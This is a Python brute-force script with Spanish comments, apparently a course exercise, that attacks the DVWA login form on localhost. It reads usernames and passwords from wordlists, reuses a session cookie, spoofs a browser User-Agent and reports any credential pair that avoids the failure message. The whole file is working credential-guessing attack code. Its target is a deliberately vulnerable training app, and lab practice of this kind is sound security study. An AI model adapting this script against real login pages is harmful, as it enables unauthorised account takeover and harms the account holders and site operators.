import requests
import time

# Configuración inicial
url = "http://127.0.0.1/vulnerabilities/brute/"
cookies = {'PHPSESSID': 's7ggm10uuf7rk9526ivfiamt50', 'security': 'low'}

# Cabeceras HTTP para simular un navegador (Punto 2.19)
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) ScriptPython/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
}

print("[*] Iniciando ataque de fuerza bruta con Python...")
start_time = time.time()

with open("usuarios.txt", "r") as file_users:
    usuarios = file_users.read().splitlines()

with open("passwords.txt", "r") as file_pass:
    passwords = file_pass.read().splitlines()

encontrados = 0

for user in usuarios:
    for password in passwords:
        # Parámetros GET
        params = {'username': user, 'password': password, 'Login': 'Login'}
        
        # Interacción con el formulario (Punto 2.18)
        response = requests.get(url, params=params, cookies=cookies, headers=headers)
        
        # Si NO está el mensaje de error, la contraseña es correcta
        if "Username and/or password incorrect." not in response.text:
            print(f"[+] ¡Éxito! Usuario: {user} | Contraseña: {password}")
            encontrados += 1

end_time = time.time()
print(f"[*] Ataque finalizado en {round(end_time - start_time, 2)} segundos.")
